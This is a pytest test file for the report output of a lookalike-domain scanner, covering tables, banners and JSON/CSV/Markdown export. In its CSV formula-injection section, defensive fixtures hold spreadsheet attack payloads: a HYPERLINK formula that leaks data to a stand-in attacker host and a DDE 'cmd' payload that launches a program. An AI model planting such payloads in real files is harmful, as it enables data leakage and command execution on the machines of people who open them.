"""Tests for the reporter output generation."""

from __future__ import annotations

from datetime import UTC, datetime
from io import StringIO

from rich.console import Console

from otacon.core.models import DomainResult, PermutationType, ScanReport
from otacon.reporters import (
    _age_cell,
    _check,
    _domain_cell,
    _flags_cell,
    _http_cell,
    _risk_bar,
    _verdict_banner,
    _verdict_banner_md,
    _why_section,
    build_live_table,
    render_table,
    to_csv,
    to_json,
    to_markdown,
)
from otacon.ui.copy import FLAGS
from otacon.utils.theme import RiskLevel
from otacon.utils.validate import redirect_host


def test_to_markdown_no_threats_contains_clear_message() -> None:
    report = ScanReport(target="example.com", total_permutations=10, results=[])

    markdown = to_markdown(report)

    assert "No suspicious registered variants detected." in markdown
    assert "**Target:** `example.com`" in markdown


def test_to_markdown_includes_detected_threat() -> None:
    result = DomainResult(
        domain="login.example.com",
        kind=PermutationType.COMBO,
        note="appended bait word",
        resolves=True,
        ip_addresses=["1.2.3.4"],
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report = ScanReport(target="example.com", total_permutations=5, results=[result])

    markdown = to_markdown(report)

    assert "| `login.example.com` | combosquat | 40 (medium) | DNS |" in markdown


def test_risk_bar_full_score():
    assert _risk_bar(100, "ok").plain == "████████ 100"


def test_risk_bar_zero_score():
    assert _risk_bar(0, "ok").plain == "░░░░░░░░   0"


def test_risk_bar_half_score():
    assert _risk_bar(50, "warn").plain == "████░░░░  50"


def test_risk_bar_75():
    assert _risk_bar(75, "danger").plain == "██████░░  75"


def test_risk_bar_25():
    assert _risk_bar(25, "info").plain == "██░░░░░░  25"


def test_check_true_shows_checkmark():
    assert _check(True).plain == "✓"


def test_check_false_shows_dash():
    assert _check(False).plain == "—"


def test_http_cell_none():
    assert _http_cell(None).plain == "—"


def test_http_cell_200():
    assert _http_cell(200).plain == "200"


def test_http_cell_301():
    assert _http_cell(301).plain == "301"


def test_http_cell_404():
    assert _http_cell(404).plain == "404"


def test_http_cell_500():
    assert _http_cell(500).plain == "500"


def test_redirect_host_extracts_netloc():
    assert redirect_host("https://www.google.com/search?q=1") == "www.google.com"


def test_redirect_host_fallback_for_bare_string():
    assert redirect_host("not-a-url") == "not-a-url"


def test_redirect_host_empty_string():
    assert redirect_host("") == ""


def _grid_text(grid) -> str:
    """Flattens a Rich renderable to text, for asserting on what it says."""
    console = Console(file=StringIO(), force_terminal=False, width=120)
    with console.capture() as captured:
        console.print(grid)
    return captured.get()


def test_domain_cell_is_just_the_name_now():
    """Technique, badges and title moved to columns and to the section below.

    Crammed into a column two dozen characters wide they wrapped across three
    lines each, so twelve findings filled a screen and a half.
    """
    r = DomainResult(domain="googel.com", kind=PermutationType.TYPO)
    assert _domain_cell(r).plain == "googel.com"


def test_flags_cell_uses_the_spelling_every_surface_uses():
    r = DomainResult(
        domain="googel.com",
        kind=PermutationType.TYPO,
        dnsbl_listed=True,
        has_login_form=True,
        risk_level=RiskLevel.CRITICAL,
    )
    assert _flags_cell(r).plain == "DBL LOGIN"


def test_flags_cell_is_empty_when_there_is_nothing_to_flag():
    assert _flags_cell(DomainResult(domain="a.com", kind=PermutationType.TYPO)).plain == ""


def test_defensive_rows_are_flagged_rather_than_annotated():
    """The redirect target used to ride in the domain cell behind a bare "»",
    which wrapped the column and explained nothing. Flags says OURS instead."""
    r = DomainResult(
        domain="googel.com",
        kind=PermutationType.TYPO,
        redirects_to="https://google.com/",
        is_likely_defensive=True,
    )
    assert _domain_cell(r).plain == "googel.com"
    assert _flags_cell(r).plain == "OURS"


def test_non_defensive_rows_carry_no_flag():
    r = DomainResult(domain="googel.com", kind=PermutationType.TYPO)
    assert _flags_cell(r).plain == ""


def _make_console(no_color: bool = True):
    from rich.console import Console

    from otacon.utils.theme import OTACON_THEME

    buf = StringIO()
    return Console(file=buf, no_color=no_color, theme=OTACON_THEME, width=120), buf


def test_render_table_verdict_shows_medium_count():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    assert "1 medium" in buf.getvalue()


def test_render_table_shows_defensive_flag():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exampl.com",
        kind=PermutationType.TYPO,
        resolves=True,
        is_likely_defensive=True,
        redirects_to="https://example.com/",
        risk_score=28,
        risk_level=RiskLevel.LOW,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    out = buf.getvalue()
    # The marker and the sentence that explains it, in words rather than a
    # glyph with a footnote.
    assert FLAGS["defensive"].short in out
    assert FLAGS["defensive"].meaning in out


def test_render_table_no_defensive_flag_when_not_defensive():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exampl.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=28,
        risk_level=RiskLevel.LOW,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    out = buf.getvalue()
    assert FLAGS["defensive"].short not in out
    assert FLAGS["defensive"].meaning not in out


def test_render_table_shows_risk_bar_characters():
    report = ScanReport(target="example.com", total_permutations=5)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=50,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    output = buf.getvalue()
    assert "█" in output
    assert "░" in output


# ---------------------------------------------------------------------------
# Age column
# ---------------------------------------------------------------------------


def test_age_cell_none_returns_dash():
    assert _age_cell(None).plain == "—"


def test_age_cell_6_days():
    assert _age_cell(6).plain == "6d"


def test_age_cell_90_days_is_3_months():
    assert _age_cell(90).plain == "3mo"


def test_age_cell_730_days_is_2_years():
    assert _age_cell(730).plain == "2y"


def test_render_table_has_age_column_header():
    report = ScanReport(target="example.com", total_permutations=5)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=28,
        risk_level=RiskLevel.LOW,
        age_days=6,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    output = buf.getvalue()
    assert "Age" in output
    assert "6d" in output


def test_render_table_age_none_does_not_crash():
    report = ScanReport(target="example.com", total_permutations=5)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=28,
        risk_level=RiskLevel.LOW,
        # age_days is None (default)
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    assert "Age" in buf.getvalue()


def test_json_export_includes_created_at():
    created = datetime(2024, 1, 15, tzinfo=UTC)
    report = ScanReport(target="example.com", total_permutations=5)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        created_at=created,
        age_days=6,
        risk_score=28,
        risk_level=RiskLevel.LOW,
    )
    report.results.append(r)
    json_str = to_json(report)
    assert "created_at" in json_str
    assert "2024-01-15" in json_str
    assert "age_days" in json_str


# ---------------------------------------------------------------------------
# Page title (Task 03)
# ---------------------------------------------------------------------------


def test_why_section_shows_the_page_title_for_dangerous_rows():
    r = DomainResult(
        domain="googel.com",
        kind=PermutationType.TYPO,
        page_title="Sign in to Google",
        risk_level=RiskLevel.HIGH,
    )
    section = _why_section([r])
    assert section is not None
    assert "Sign in to Google" in _grid_text(section)


def test_why_section_covers_critical_rows_too():
    r = DomainResult(
        domain="googel.com",
        kind=PermutationType.TYPO,
        page_title="Verify your account",
        risk_level=RiskLevel.CRITICAL,
    )
    section = _why_section([r])
    assert section is not None
    assert "Verify your account" in _grid_text(section)


def test_why_section_leaves_medium_rows_out():
    r = DomainResult(
        domain="googel.com",
        kind=PermutationType.TYPO,
        page_title="Some page",
        risk_level=RiskLevel.MEDIUM,
    )
    assert _why_section([r]) is None


def test_why_section_is_absent_when_nothing_is_dangerous():
    """Printing an empty "Why these matter" under a clean table says nothing."""
    harmless = DomainResult(
        domain="googel.com", kind=PermutationType.TYPO, risk_level=RiskLevel.LOW
    )
    assert _why_section([harmless]) is None


def test_json_export_includes_page_title():
    report = ScanReport(target="example.com", total_permutations=5)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        page_title="Login - ExampleBank",
        risk_score=68,
        risk_level=RiskLevel.HIGH,
    )
    report.results.append(r)
    json_str = to_json(report)
    assert "page_title" in json_str
    assert "Login - ExampleBank" in json_str


# ---------------------------------------------------------------------------
# Verdict summary banner (Task 08)
# ---------------------------------------------------------------------------


def test_verdict_banner_clean_when_no_registered():
    report = ScanReport(target="example.com", total_permutations=10)
    banner = _verdict_banner(report)
    assert "clean" in banner.plain


def test_verdict_banner_shows_registered_count():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    banner = _verdict_banner(report)
    assert "1 registered" in banner.plain


def test_verdict_banner_shows_crit_count():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        has_mx=True,
        has_ssl=True,
        http_status=200,
        risk_score=95,
        risk_level=RiskLevel.CRITICAL,
    )
    report.results.append(r)
    banner = _verdict_banner(report)
    assert "crit: 1" in banner.plain


def test_verdict_banner_shows_mx_count():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        has_mx=True,
        risk_score=45,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    banner = _verdict_banner(report)
    assert "mx: 1" in banner.plain


def test_verdict_banner_shows_fresh_count():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        age_days=3,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    banner = _verdict_banner(report)
    assert "fresh <7d: 1" in banner.plain


def test_verdict_banner_fresh_label_tracks_age_fresh_days_constant(monkeypatch) -> None:
    """The '<Nd>' label must read AGE_FRESH_DAYS, not a hardcoded '<7d>'."""
    from otacon import scoring

    monkeypatch.setattr(scoring, "AGE_FRESH_DAYS", 14)
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        age_days=10,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)

    banner = _verdict_banner(report)

    assert "fresh <14d: 1" in banner.plain


def test_verdict_banner_md_clean():
    report = ScanReport(target="example.com", total_permutations=5)
    md = _verdict_banner_md(report)
    assert "clean" in md
    assert "✓" in md


def test_verdict_banner_md_with_threats():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    md = _verdict_banner_md(report)
    assert "registered" in md
    assert "crit:" in md


def test_verdict_banner_md_fresh_label_tracks_age_fresh_days_constant(monkeypatch) -> None:
    from otacon import scoring

    monkeypatch.setattr(scoring, "AGE_FRESH_DAYS", 14)
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        age_days=10,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)

    md = _verdict_banner_md(report)

    assert "fresh <14d: 1" in md


def test_to_markdown_includes_verdict_banner():
    report = ScanReport(target="example.com", total_permutations=5)
    md = to_markdown(report)
    # Banner is the first substantive line after the header
    assert "clean" in md or "registered" in md


def test_render_table_shows_verdict_banner_above_table():
    report = ScanReport(target="example.com", total_permutations=10)
    r = DomainResult(
        domain="exmaple.com",
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=40,
        risk_level=RiskLevel.MEDIUM,
    )
    report.results.append(r)
    console, buf = _make_console()
    render_table(report, console)
    output = buf.getvalue()
    # Banner must appear before the table border characters
    banner_pos = output.find("registered")
    table_pos = output.find("Domain")
    assert banner_pos < table_pos


# ---------------------------------------------------------------------------
# Live table (Task 07)
# ---------------------------------------------------------------------------


def _make_hit(domain: str, score: int, level: RiskLevel) -> DomainResult:
    return DomainResult(
        domain=domain,
        kind=PermutationType.TYPO,
        resolves=True,
        risk_score=score,
        risk_level=level,
    )


def test_build_live_table_returns_table_with_columns():
    from rich.table import Table

    hits = [_make_hit("exmaple.com", 40, RiskLevel.MEDIUM)]
    table = build_live_table(hits, "example.com")
    assert isinstance(table, Table)
    # Risk, Domain, Tech, Age, Signals, Flags — the same six the triage
    # console shows, in the same order.
    assert len(table.columns) == 6


def test_build_live_table_empty_hits_has_no_rows():
    table = build_live_table([], "example.com")
    assert table.row_count == 0


def test_build_live_table_sorts_by_score_descending():
    hits = [
        _make_hit("low.com", 20, RiskLevel.LOW),
        _make_hit("crit.com", 90, RiskLevel.CRITICAL),
        _make_hit("med.com", 50, RiskLevel.MEDIUM),
    ]
    table = build_live_table(hits, "example.com")
    assert table.row_count == 3
    # Domain is the second column now: Risk leads, as it does in the console.
    first_cell = table.columns[1]._cells[0]
    assert "crit.com" in (first_cell.plain if hasattr(first_cell, "plain") else str(first_cell))


def test_build_live_table_includes_domain_name():
    hits = [_make_hit("evil-example.com", 60, RiskLevel.HIGH)]
    table = build_live_table(hits, "example.com")
    cell = table.columns[1]._cells[0]
    text = cell.plain if hasattr(cell, "plain") else str(cell)
    assert "evil-example.com" in text


def test_to_csv_uses_lf_line_endings() -> None:
    """CSV output must not contain \\r\\n — text-mode write_text on Windows would
    double-translate it to \\r\\r\\n, corrupting the file."""
    report = ScanReport(target="example.com", total_permutations=0)
    csv_text = to_csv(report)
    assert "\r" not in csv_text


# ---------------------------------------------------------------------------
# to_csv — formula-injection guard (CWE-1236)
#
# page_title / redirects_to are lifted verbatim from the hostile lookalike's
# own HTTP response — a cell starting with =/+/-/@ is evaluated as a formula
# by Excel/LibreOffice/Sheets on open, letting the attacker's own site smuggle
# a payload into the analyst's spreadsheet.
# ---------------------------------------------------------------------------


def test_to_csv_neutralizes_formula_in_page_title() -> None:
    r = _make_hit("evil.com", 70, RiskLevel.HIGH)
    r.page_title = '=HYPERLINK("http://evil.example/leak","click")'
    report = ScanReport(target="example.com", total_permutations=1, results=[r])

    csv_text = to_csv(report)

    assert '=HYPERLINK("http://evil.example/leak","click")' not in csv_text
    assert "'=HYPERLINK" in csv_text


def test_to_csv_neutralizes_formula_in_redirects_to() -> None:
    r = _make_hit("evil.com", 70, RiskLevel.HIGH)
    r.redirects_to = "=cmd|'/c calc'!A0"
    report = ScanReport(target="example.com", total_permutations=1, results=[r])

    csv_text = to_csv(report)

    row = csv_text.splitlines()[1]
    assert "'=cmd|" in row


def test_to_csv_leaves_normal_values_untouched() -> None:
    r = _make_hit("evil.com", 70, RiskLevel.HIGH)
    r.page_title = "Welcome to Evil Corp"
    report = ScanReport(target="example.com", total_permutations=1, results=[r])

    csv_text = to_csv(report)

    assert "Welcome to Evil Corp" in csv_text
    assert "'Welcome" not in csv_text


def test_to_csv_neutralizes_formula_with_leading_whitespace() -> None:
    r = _make_hit("evil.com", 70, RiskLevel.HIGH)
    r.page_title = "  =1+1"
    report = ScanReport(target="example.com", total_permutations=1, results=[r])
    csv_text = to_csv(report)
    assert "'  =1+1" in csv_text


def test_to_csv_neutralizes_formula_in_domain() -> None:
    r = _make_hit("=cmd|'/c calc'!A0", 70, RiskLevel.HIGH)
    report = ScanReport(target="example.com", total_permutations=1, results=[r])

    csv_text = to_csv(report)

    row = csv_text.splitlines()[1]
    assert "'=cmd|" in row


# ---------------------------------------------------------------------------
# Aggregate JSON
# ---------------------------------------------------------------------------


def _make_report_with_results(domain: str, results=()) -> ScanReport:
    from otacon.core.models import DomainResult, PermutationType, ScanReport
    from otacon.utils.theme import RiskLevel

    r = ScanReport(target=domain, total_permutations=10)
    for kwargs in results:
        r.results.append(
            DomainResult(
                domain=kwargs["domain"],
                kind=PermutationType.TYPO,
                resolves=kwargs.get("resolves", True),
                risk_score=kwargs.get("risk_score", 0),
                risk_level=kwargs.get("risk_level", RiskLevel.SAFE),
            )
        )
    return r


def test_aggregate_json_top_level_keys() -> None:
    import json

    from otacon.core.models import ScanReport
    from otacon.reporters import aggregate_json

    reports = {"github.com": ScanReport(target="github.com", total_permutations=5)}
    payload = json.loads(aggregate_json(reports))
    assert set(payload.keys()) == {"scanned_at", "domains", "summary"}


def test_aggregate_json_domain_keys_match_input() -> None:
    import json

    from otacon.core.models import ScanReport
    from otacon.reporters import aggregate_json

    reports = {
        "github.com": ScanReport(target="github.com", total_permutations=5),
        "google.com": ScanReport(target="google.com", total_permutations=3),
    }
    payload = json.loads(aggregate_json(reports))
    assert set(payload["domains"].keys()) == {"github.com", "google.com"}


def test_aggregate_json_summary_counts() -> None:
    import json

    from otacon.reporters import aggregate_json
    from otacon.utils.theme import RiskLevel

    reports = {
        "a.com": _make_report_with_results(
            "a.com",
            [
                {
                    "domain": "aa.com",
                    "resolves": True,
                    "risk_score": 90,
                    "risk_level": RiskLevel.CRITICAL,
                },
            ],
        ),
        "b.com": _make_report_with_results(
            "b.com",
            [
                {
                    "domain": "bb.com",
                    "resolves": True,
                    "risk_score": 60,
                    "risk_level": RiskLevel.HIGH,
                },
                {
                    "domain": "bbb.com",
                    "resolves": True,
                    "risk_score": 40,
                    "risk_level": RiskLevel.MEDIUM,
                },
            ],
        ),
    }
    payload = json.loads(aggregate_json(reports))
    summary = payload["summary"]
    assert summary["total_registered"] == 3
    assert summary["critical"] == 1
    assert summary["high"] == 1
    assert summary["medium"] == 1


# ---------------------------------------------------------------------------
# render_aggregate_summary
# ---------------------------------------------------------------------------


def test_aggregate_summary_shows_total_registered() -> None:
    from otacon.reporters import render_aggregate_summary

    reports = {
        "a.com": _make_report_with_results(
            "a.com",
            [
                {
                    "domain": "aa.com",
                    "resolves": True,
                    "risk_score": 90,
                    "risk_level": RiskLevel.CRITICAL,
                },
            ],
        )
    }
    console, buf = _make_console()
    render_aggregate_summary(reports, [], console)
    assert "1 registered" in buf.getvalue()


def test_aggregate_summary_shows_risk_counts() -> None:
    from otacon.reporters import render_aggregate_summary

    reports = {
        "x.com": _make_report_with_results(
            "x.com",
            [
                {
                    "domain": "x1.com",
                    "resolves": True,
                    "risk_score": 90,
                    "risk_level": RiskLevel.CRITICAL,
                },
                {
                    "domain": "x2.com",
                    "resolves": True,
                    "risk_score": 65,
                    "risk_level": RiskLevel.HIGH,
                },
                {
                    "domain": "x3.com",
                    "resolves": True,
                    "risk_score": 40,
                    "risk_level": RiskLevel.MEDIUM,
                },
            ],
        )
    }
    console, buf = _make_console()
    render_aggregate_summary(reports, [], console)
    output = buf.getvalue()
    assert "crit: 1" in output and "high: 1" in output and "med: 1" in output


def test_aggregate_summary_shows_errors_as_error_label() -> None:
    from otacon.reporters import render_aggregate_summary

    console, buf = _make_console()
    render_aggregate_summary(
        {"ok.com": _make_report_with_results("ok.com", [])},
        ["bad.com"],
        console,
    )
    output = buf.getvalue()
    assert "bad.com" in output and "ERROR" in output


def test_aggregate_summary_empty_reports_only_errors() -> None:
    from otacon.reporters import render_aggregate_summary

    console, buf = _make_console()
    render_aggregate_summary({}, ["failed.com"], console)
    output = buf.getvalue()
    assert "failed.com" in output and "ERROR" in output


# ---------------------------------------------------------------------------
# aggregate_json edge cases
# ---------------------------------------------------------------------------


def test_aggregate_json_empty_reports_dict() -> None:
    import json

    from otacon.reporters import aggregate_json

    payload = json.loads(aggregate_json({}))
    assert payload["summary"] == {
        "total_registered": 0,
        "critical": 0,
        "high": 0,
        "medium": 0,
        "low": 0,
    }


def test_aggregate_json_no_registered_results() -> None:
    import json

    from otacon.reporters import aggregate_json

    report = ScanReport(target="a.com", total_permutations=10)
    payload = json.loads(aggregate_json({"a.com": report}))
    assert payload["summary"]["total_registered"] == 0


def test_aggregate_json_timestamp_is_iso8601() -> None:
    import json
    from datetime import datetime

    from otacon.reporters import aggregate_json

    report = ScanReport(target="x.com", total_permutations=0)
    payload = json.loads(aggregate_json({"x.com": report}))
    dt = datetime.fromisoformat(payload["scanned_at"])
    assert dt.tzinfo is not None


def test_aggregate_json_domain_value_is_full_scan_report() -> None:
    import json

    from otacon.reporters import aggregate_json

    report = ScanReport(target="g.com", total_permutations=7)
    payload = json.loads(aggregate_json({"g.com": report}))
    d = payload["domains"]["g.com"]
    assert d["target"] == "g.com" and d["total_permutations"] == 7 and "results" in d


def test_aggregate_json_summary_includes_low_count() -> None:
    import json

    from otacon.reporters import aggregate_json

    reports = {
        "c.com": _make_report_with_results(
            "c.com",
            [
                {
                    "domain": "cc.com",
                    "resolves": True,
                    "risk_score": 20,
                    "risk_level": RiskLevel.LOW,
                },
            ],
        )
    }
    payload = json.loads(aggregate_json(reports))
    assert payload["summary"]["low"] == 1


def test_hostile_page_title_renders_verbatim() -> None:
    """A page title containing markup brackets must not gain a backslash.

    rich.Text.append takes literal text and never parses console markup, so
    passing the title through rich.markup.escape rendered the escape character
    itself, leaking a stray backslash into the output. The title is
    attacker-controlled, so this guard moved with it when the page title left
    the domain cell for the why section.
    """
    result = DomainResult(
        domain="exampl3.com",
        kind=PermutationType.TYPO,
        resolves=True,
        page_title="[b] domain for sale",
        risk_level=RiskLevel.CRITICAL,
    )
    section = _why_section([result])
    assert section is not None
    rendered = _grid_text(section)
    assert "[b] domain for sale" in rendered
    assert r"\[b]" not in rendered


# ── one vocabulary, one glyph budget ────────────────────────────────────


def test_the_console_and_the_triage_console_spell_flags_the_same() -> None:
    """They used to disagree three ways: `[cloned-favicon]` here, `FAVICON`
    there and `cloned favicon` in the HTML, for one finding."""
    from otacon.tui.widgets import badges

    r = DomainResult(
        domain="a.com",
        kind=PermutationType.TYPO,
        dnsbl_listed=True,
        favicon_matches_target=True,
        has_login_form=True,
        risk_level=RiskLevel.CRITICAL,
    )
    assert _flags_cell(r).plain == badges(r)


def test_the_table_degrades_to_ascii(monkeypatch) -> None:
    """A terminal that cannot draw U+2588 was shown a bar made of them."""
    from otacon.ui.caps import GlyphLevel
    from otacon.utils import theme

    monkeypatch.setattr(theme, "_glyphs", GlyphLevel.ASCII)
    try:
        assert _risk_bar(50, "ok").plain.isascii()
        assert _check(True).plain.isascii()
        assert _check(False).plain.isascii()
        report = ScanReport(
            target="example.com",
            total_permutations=10,
            results=[
                DomainResult(
                    domain="a.com",
                    kind=PermutationType.TYPO,
                    resolves=True,
                    ip_addresses=["1.2.3.4"],
                    risk_score=90,
                    risk_level=RiskLevel.CRITICAL,
                )
            ],
        )
        console, buf = _make_console()
        render_table(report, console)
        assert buf.getvalue().isascii()
    finally:
        theme.set_glyphs(GlyphLevel.FULL)


# ── --top ───────────────────────────────────────────────────────────────


def _many(count: int) -> ScanReport:
    return ScanReport(
        target="example.com",
        total_permutations=count,
        results=[
            DomainResult(
                domain=f"d{i}.com",
                kind=PermutationType.TYPO,
                resolves=True,
                ip_addresses=["1.2.3.4"],
                risk_score=count - i,
                risk_level=RiskLevel.MEDIUM,
            )
            for i in range(count)
        ],
    )


def test_top_keeps_the_riskiest_rows_and_says_what_it_hid() -> None:
    """A busy brand returns a hundred registered lookalikes; the first handful
    are the ones anybody acts on."""
    console, buf = _make_console()
    render_table(_many(20), console, top=3)
    out = buf.getvalue()
    assert "d0.com" in out and "d2.com" in out
    assert "d9.com" not in out
    assert "+17 more" in out


def test_top_is_inert_when_there_is_nothing_to_hide() -> None:
    console, buf = _make_console()
    render_table(_many(3), console, top=10)
    assert "more below the top" not in buf.getvalue()
